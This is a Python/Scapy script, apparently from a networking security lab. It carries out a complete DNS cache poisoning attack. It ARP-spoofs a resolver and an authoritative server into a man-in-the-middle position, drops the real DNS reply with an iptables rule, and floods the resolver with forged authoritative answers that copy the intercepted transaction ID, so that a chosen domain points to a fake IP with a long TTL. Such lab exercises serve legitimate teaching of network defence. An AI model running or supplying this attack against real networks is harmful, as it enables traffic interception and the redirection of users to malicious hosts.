"""
Attack overview:
  1. ARP-poison the resolver (10.9.0.53) and authoritative (10.9.0.153) so all
     DNS traffic between them passes through the attacker.
  2. Drop the legitimate authoritative reply via iptables so the resolver only
     sees our forged response.
  3. Sniff the forwarded DNS query and immediately send a burst of crafted DNS
     responses with FAKE_IP as the answer.

Because the resolver uses a fixed source port (33333), the only unknown in the
forged packet is the 16-bit Transaction ID, which we read directly from the
intercepted query - so no guessing is needed.

Run inside the attacker container:
    python3 cache_poisoning.py

Verify on client:
    dig @10.9.0.53 www.example.com +short
"""

from scapy.all import *
import atexit
import signal
import subprocess
import sys
import threading
import time

RESOLVER_IP = "10.9.0.53"
AUTH_SERVER_IP = "10.9.0.153"
ATTACKER_IP = "10.9.0.10"
TARGET_DOMAIN = "www.example.com"
FAKE_IP = "6.6.6.6"            # IP we want the resolver to cache for TARGET_DOMAIN
POISON_INTERVAL = 1.0           # seconds between ARP poison refreshes


running = True
resolver_mac = None
auth_mac = None


# Setup ip forwarding
def set_ip_forward(enabled):
    value = "1" if enabled else "0"
    subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={value}"], check=False, stdout=subprocess.DEVNULL)


def set_drop_rule(enabled):
    """Insert or remove an iptables rule that drops the real authoritative reply.

    We drop UDP packets from AUTH_SERVER_IP:53 to RESOLVER_IP on the resolver's
    fixed source port (33333).  This ensures the resolver never sees the real
    answer and accepts our forged one instead.

    Input:  enabled - bool (True = insert rule, False = delete rule)
    Output: None (modifies iptables)
    """
    base_cmd = [
        "iptables",
        "-w",
        "-t",
        "filter",
        "FORWARD",
        "-p",
        "udp",
        "-s",
        AUTH_SERVER_IP,
        "-d",
        RESOLVER_IP,
        "--sport",
        "53",
        "--dport",
        "33333",
        "-j",
        "DROP",
    ]
    action = "-I" if enabled else "-D"
    subprocess.run(["iptables", "-w", action, *base_cmd[4:]], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


# we reolve the MAC address for a given IP via ARP
def resolve_mac(ip):
    """Resolve the MAC address for a given IP via ARP.

    Input:  ip  - str, target IPv4 address
    Output: str - MAC address string (e.g. "aa:bb:cc:dd:ee:ff"), or None on failure
    """
    ans = srp1(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
        timeout=2,
        verbose=0,
    )
    if ans and ans.haslayer(ARP):
        return ans[ARP].hwsrc
    return None


def poison_once():
    """Send one round of gratuitous ARP replies to position attacker as MITM.

    Tells the resolver that AUTH_SERVER_IP maps to our MAC, and tells the
    authoritative server that RESOLVER_IP maps to our MAC.  Both sides then
    forward traffic through us.

    Input:  None (uses module-level globals)
    Output: None (sends ARP packets)
    """
    # Tell resolver that authoritative IP is at attacker MAC.
    sendp(
        Ether(dst=resolver_mac) / ARP(op=2, psrc=AUTH_SERVER_IP, pdst=RESOLVER_IP, hwdst=resolver_mac),
        verbose=0,
    )
    # Tell authoritative that resolver IP is at attacker MAC.
    sendp(
        Ether(dst=auth_mac) / ARP(op=2, psrc=RESOLVER_IP, pdst=AUTH_SERVER_IP, hwdst=auth_mac),
        verbose=0,
    )


def restore_arp():
    """Restore correct ARP mappings for both resolver and authoritative server.

    Broadcasts the real MAC <-> IP bindings so the network returns to normal
    after the attack.  Called automatically at exit via atexit.

    Input:  None
    Output: None (sends ARP packets)
    """
    if not resolver_mac or not auth_mac:
        return
    sendp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=AUTH_SERVER_IP, hwsrc=auth_mac, pdst=RESOLVER_IP, hwdst="ff:ff:ff:ff:ff:ff"),
        count=5,
        verbose=0,
    )
    sendp(
        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=RESOLVER_IP, hwsrc=resolver_mac, pdst=AUTH_SERVER_IP, hwdst="ff:ff:ff:ff:ff:ff"),
        count=5,
        verbose=0,
    )


def poison_loop():
    """Continuously refresh ARP poison at POISON_INTERVAL until stopped.

    Runs in a background daemon thread so ARP caches don't expire mid-attack.

    Input:  None
    Output: None (infinite loop until global `running` is False)
    """
    while running:
        poison_once()
        time.sleep(POISON_INTERVAL)


def stop_handler(signum, frame):
    """Signal handler for SIGINT/SIGTERM - signals the main loop to stop.

    Input:  signum - int, signal number
            frame  - current stack frame (unused)
    Output: None (sets global `running = False`)
    """
    del signum, frame
    global running
    running = False
#################### DO NOT TOUCH ####################


def spoof_dns(pkt):
    """Callback invoked for every DNS query intercepted between resolver and authoritative.

    Checks whether the query is for TARGET_DOMAIN.  If so, crafts a forged DNS
    response that matches the intercepted query's Transaction ID and source port,
    but returns FAKE_IP as the answer.  Sends a burst of 64 copies to race any
    delayed legitimate reply.

    The forged packet fields that must match the resolver's expectation:
        - IP src  : AUTH_SERVER_IP  (resolver trusts only this source)
        - IP dst  : RESOLVER_IP
        - UDP sport: 53             (authoritative server's standard port)
        - UDP dport: pkt[UDP].sport (resolver's fixed upstream port, 33333)
        - DNS id  : pkt[DNS].id     (Transaction ID from the intercepted query)
        - DNS qr  : 1               (this is a response, not a query)
        - DNS aa  : 1               (claim to be authoritative)

    Input:  pkt - Scapy packet captured by sniff()
    Output: None (sends forged DNS packets via sendp)
    """
    if not (pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS) and pkt[DNS].qd):
        return

    # Extract the queried domain name, strip trailing dot, normalise to lowercase
    qname = pkt[DNS].qd.qname.decode(errors="replace").rstrip(".").lower()

    if pkt[IP].src == RESOLVER_IP and pkt[IP].dst == AUTH_SERVER_IP and qname == TARGET_DOMAIN.lower():

        # Craft a forged DNS response:
        #   - Ether: deliver directly to resolver's MAC (we are in MITM position)
        #   - IP:    pretend to originate from the authoritative server
        #   - UDP:   sport=53 (auth server port), dport=33333 (resolver's fixed port)
        #   - DNS:   mirror the TX ID; single A record pointing to FAKE_IP
        forged = (
            Ether(dst=resolver_mac)
            / IP(src=AUTH_SERVER_IP, dst=RESOLVER_IP)
            / UDP(sport=53, dport=pkt[UDP].sport)   # sport=auth port, dport=resolver fixed src port
            / DNS(
                id=pkt[DNS].id,     # Must match the query's Transaction ID exactly
                qr=1,               # This is a response
                aa=1,               # Claim to be authoritative
                rd=pkt[DNS].rd,     # Mirror the Recursion Desired bit
                ra=1,               # Recursion Available
                qdcount=1,
                ancount=1,
                qd=DNSQR(qname=TARGET_DOMAIN, qtype="A", qclass="IN"),
                an=DNSRR(
                    rrname=TARGET_DOMAIN,
                    type="A",
                    rclass="IN",
                    ttl=86400,       # Long TTL so poisoned entry stays in cache
                    rdata=FAKE_IP,
                ),
            )
        )

        # Send a larger L2 burst so spoofed packets arrive before resolver retries.
        sendp([forged] * 64, verbose=0)

        print(f"[+] Sent forged response burst for {TARGET_DOMAIN} -> {FAKE_IP}")

if __name__ == "__main__":
    print("[*] Resolving target MAC addresses...")
    resolver_mac = resolve_mac(RESOLVER_IP)
    auth_mac = resolve_mac(AUTH_SERVER_IP)

    if not resolver_mac or not auth_mac:
        print("[!] Could not resolve resolver/authoritative MAC addresses.")
        sys.exit(1)

    print(f"[*] Resolver MAC: {resolver_mac}")
    print(f"[*] Authoritative MAC: {auth_mac}")

    set_ip_forward(True)
    set_drop_rule(True)
    atexit.register(restore_arp)
    atexit.register(lambda: set_drop_rule(False))
    atexit.register(lambda: set_ip_forward(False))
    signal.signal(signal.SIGINT, stop_handler)
    signal.signal(signal.SIGTERM, stop_handler)

    poisoner = threading.Thread(target=poison_loop, daemon=True)
    poisoner.start()

    print(f"[*] MITM active. Sniffing DNS queries {RESOLVER_IP} -> {AUTH_SERVER_IP}...")
    sniff(
        filter=f"udp and src host {RESOLVER_IP} and dst host {AUTH_SERVER_IP} and dst port 53",
        prn=spoof_dns,
        stop_filter=lambda _: not running,
    )

    restore_arp()
    set_drop_rule(False)
    set_ip_forward(False)
